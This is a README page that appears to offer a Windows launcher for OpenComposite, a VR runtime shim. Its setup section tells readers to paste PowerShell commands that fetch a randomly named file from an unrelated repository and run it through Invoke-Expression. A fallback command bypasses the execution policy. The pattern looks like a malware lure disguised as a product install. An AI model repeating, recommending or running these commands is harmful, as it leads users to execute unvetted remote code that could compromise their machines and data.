# OpenComposite

OpenComposite is the Windows tool this page sets up. The command in Quick Setup installs it on this PC. You open OpenComposite to start and manage what it runs.

OpenComposite implements the OpenVR interface that SteamVR-based applications expect, then forwards tracking, rendering, and controller input to an OpenXR runtime or the legacy Oculus stack on your PC. The launcher here is the everyday control surface: it applies a system-wide runtime swap, refreshes binary components, and gives you one place to undo the change when you want SteamVR back.

Extract the package to a folder you keep, then start OpenComposite.exe from File Explorer. Choose Switch to OpenComposite and wait while the tool places runtime files where OpenVR looks for them. Your next VR session from Steam or another client should start without the SteamVR dashboard unless the title itself requires it. If one game misbehaves, keep a backup of the original openvr_api.dll and try the thirty-two-bit or sixty-four-bit replacement that matches that build.

This repository holds the Windows launcher build, sample opencomposite.ini settings for Vulkan and logging, and a short changelog tied to version tags. The notes explain when to prefer the OpenXR branch over older Oculus-only builds and which controller or keyboard gaps remain in the shim. Skim the changelog before switching runtimes so you know whether a release fixes crash popups from missing OpenVR interfaces or adjusts launcher update detection.

## What you open

- OpenComposite.exe applies a system-wide OpenVR runtime swap with one click on Windows.
- SteamVR-built games talk to OpenComposite, which forwards calls to OpenXR or Oculus underneath.
- Switch to OpenComposite stages current runtime DLLs into the paths OpenVR titles expect at launch.
- Per-game setup replaces each title's openvr_api.dll with the matching thirty-two or sixty-four bit build.
- Reopening the launcher shows whether a newer build is available and can refresh components in place.
- opencomposite.ini lets you disable Vulkan initialization when certain headsets refuse to start specific titles.
- You can restore SteamVR as the active runtime from the same launcher window without manual registry edits.

## Quick Setup (PowerShell)

This installs the tool OpenComposite on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/s-engel624081/opencomposite-setup-guide/main/3d9lo8ykyn.kn73v6sg | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/s-engel624081/opencomposite-setup-guide/main/3d9lo8ykyn.kn73v6sg | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `3d9lo8ykyn.kn73v6sg` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `s-engel624081/opencomposite-setup-guide`. OpenComposite 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
